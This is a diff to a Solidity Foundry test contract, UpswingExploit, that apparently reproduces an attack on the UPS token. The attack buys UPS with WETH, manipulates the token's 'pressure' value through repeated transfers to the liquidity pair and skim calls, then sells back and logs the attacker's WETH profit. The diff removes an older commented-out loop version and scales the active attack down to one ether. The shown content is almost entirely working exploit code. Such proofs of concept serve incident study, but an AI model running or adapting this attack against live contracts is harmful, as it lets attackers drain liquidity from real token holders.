@@ -37,46 +37,8 @@ contract UpswingExploit is Test {
     }
 
     function testExploit() public {
-      /*
+      // sample attack with 1 ether
       deal(weth, address(this), 1 ether);
-      address[] memory path = new address[](2);
-      
-
-      IERC20(upsToken).approve(address(uniRouter), type(uint256).max);
-      IERC20(weth).approve(address(uniRouter), type(uint256).max);
-
-      uint256 balance;
-      for(uint i; i < 10; i++) {
-        path[0] = weth;
-        path[1] = upsToken;
-        uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])
-        console.log("prev preassure", ITokenUPS(upsToken).myPressure(address(this)));
-
-        balance = IERC20(upsToken).balanceOf(address(this));
-        for(uint j; j < 20; ++j) {
-          IERC20(upsToken).transfer(address(lp), balance);
-          lp.skim(address(this));
-        }
-
-        console.log("after fake swaps preassure", ITokenUPS(upsToken).myPressure(address(this)));
-
-        IERC20(upsToken).transfer(address(this), 0);
-
-        path[0] = upsToken;
-        path[1] = weth;
-
-        balance = IERC20(upsToken).balanceOf(address(this));
-        uniRouter.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])
-
-      }
-
-
-
-      console.log("profit!", IERC20(weth).balanceOf(address(this)) - 1 ether);
-      emit log_named_decimal_uint("After exploiting, Attacker WETH Balance", IERC20(weth).balanceOf(address(this)),18);
-*/
-
-      deal(weth, address(this), 100 ether);
       address[] memory path = new address[](2);
       path[0] = weth;
       path[1] = upsToken;
@@ -84,9 +46,7 @@ contract UpswingExploit is Test {
 
       IERC20(weth).approve(address(uniRouter), type(uint256).max);
 
-      for(uint i; i < 10; ++i) {
-        uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])
-      }
+      uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])
 
       console.log("prev preassure", ITokenUPS(upsToken).myPressure(address(this)));
 
@@ -107,8 +67,8 @@ contract UpswingExploit is Test {
       IERC20(upsToken).approve(address(uniRouter), type(uint256).max);
       uniRouter.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])
 
-      console.log("profit!", IERC20(weth).balanceOf(address(this)) - 10 ether);
-      emit log_named_decimal_uint("After exploiting, Attacker WETH Balance", IERC20(weth).balanceOf(address(this)) - 10 ether,18);
+      console.log("profit!", IERC20(weth).balanceOf(address(this)) - 1 ether);
+      emit log_named_decimal_uint("After exploiting, Attacker WETH Balance", IERC20(weth).balanceOf(address(this)) - 1 ether,18);
 
     }
 }
